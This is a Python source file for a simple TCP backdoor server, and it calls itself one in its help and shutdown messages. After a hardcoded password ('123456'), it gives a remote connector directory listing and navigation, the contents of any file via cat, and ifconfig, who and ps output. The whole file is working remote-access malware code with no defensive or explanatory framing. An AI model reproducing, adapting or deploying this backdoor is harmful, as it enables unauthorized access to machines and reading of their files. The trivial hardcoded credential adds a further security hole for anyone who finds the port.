import socketserver
import socket, threading
import subprocess, sys, os, signal
class MyTCPHandler(socketserver.BaseRequestHandler):
   BUFFER_SIZE = 4096

   def handle(self):

       def help_ins():
           self.request.send(bytearray("----- AVAILABLE COMMANDS ----- \n", "utf-8"))
           self.request.send(bytearray("help - lists all the commands \n", "utf-8"))
           self.request.send(bytearray("off  - terminates this backdoor \n\n", "utf-8"))
           self.request.send(bytearray("pwd  - returns current directory \n", "utf-8"))
           self.request.send(bytearray("ls   - lists the contents of the current working directory \n", "utf-8"))
           self.request.send(bytearray("cat <file> - returns the contents of the file \n", "utf-8"))
           self.request.send(bytearray("cd <dir>  - changes current working directory \n", "utf-8"))
           self.request.send(bytearray("----- ADDITIONAL COMMANDS ----- \n", "utf-8"))
           self.request.send(bytearray("who  - list user[s] currently logged in \n", "utf-8"))
           self.request.send(bytearray("ps  - show currently running processes \n", "utf-8"))
           self.request.send(bytearray("net  - show ifconfig configurations \n", "utf-8")) 

       PASSWORD = "123456"
       PASS_ACPT = False

       print("WELCOME SCUMBAG")
       while 1: 
           if PASS_ACPT:
               self.request.send(bytearray("Enter CMD: ", "utf-8"))
           else:
               self.request.send(bytearray("Enter PASS: ", "utf-8"))

           data = self.request.recv(self.BUFFER_SIZE)
           if len(data) == self.BUFFER_SIZE:
               while 1:
                   try:  # error means no more data
                       data += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)
                   except:
                       break
           if len(data) == 0:
               break
           data = data.decode( "utf-8")
           self.request.sendall( bytearray( "You said: " + data, "utf-8"))
           print("%s (%s) wrote: %s" % (self.client_address[0], 
                 threading.currentThread().getName(), data.strip()))

           if data.strip() == "123456":
                self.request.send(bytearray("PASSWORD ACCEPTED \n", "utf-8"))
                PASS_ACPT = True 
                #create list
           elif data.strip() == "off" and PASS_ACPT:
                self.request.send(bytearray("TERMINATING BACKDOOR \n", "utf-8"))
                self.server.shutdown()
                os.kill(os.getpid(),signal.SIGHUP)
           elif data.strip() == "help" and PASS_ACPT:
                help_ins()
           elif data.strip() == "ls" and PASS_ACPT:
                FILES = os.listdir() 
                temp = str(os.listdir())
                self.request.send(bytearray("Files in Current Directory: "+ temp + "\n", "utf-8"))
           elif data.strip() == "pwd" and PASS_ACPT:
                temp = os.getcwd()
                self.request.send(bytearray("Current working dir: "+ temp + "\n", "utf-8"))
           elif data.strip() == "net" and PASS_ACPT:
                proc = subprocess.Popen("ifconfig", stdout=subprocess.PIPE, shell=False)
                (out, err) = proc.communicate()
                self.request.send(out) 
           elif (data.strip() == "who" or data.strip() == "ps") and PASS_ACPT:
                proc = subprocess.Popen([data.strip()], stdout=subprocess.PIPE, shell=False)
                (out, err) = proc.communicate()
                self.request.send(out)
           else:
                if(data.strip().split()[0] == "cat" and len(data.strip().split()) == 2 and PASS_ACPT):
                    proc = subprocess.Popen(["cat", data.strip().split()[1]], stdout=subprocess.PIPE, shell=False)
                    (out, err) = proc.communicate()
                    self.request.send(out)
                elif(data.strip().split()[0] == "cd" and len(data.strip().split()) == 2 and PASS_ACPT):
                    if data.strip().split()[1] in FILES or data.strip().split()[1] == "..":
                        try:
                            os.chdir(data.strip().split()[1])
                            self.request.send(bytearray("Now In Directory: "+ os.getcwd() + "\n", "utf-8"))
                        except: 
                            self.request.send(bytearray("Directory Does Not Exist \n", "utf-8"))
                else:
                    self.request.send(bytearray("INVALID COMMAND \n", "utf-8"))

if __name__ == "__main__":
   HOST, PORT = "localhost", 4044
   server = socketserver.ThreadingTCPServer((HOST, PORT), MyTCPHandler)
   print("Server On")
   try:
        server.serve_forever()
   except KeyboardInterrupt:
        pass
   print("Server Shutting Down")
   server.server_close()
   
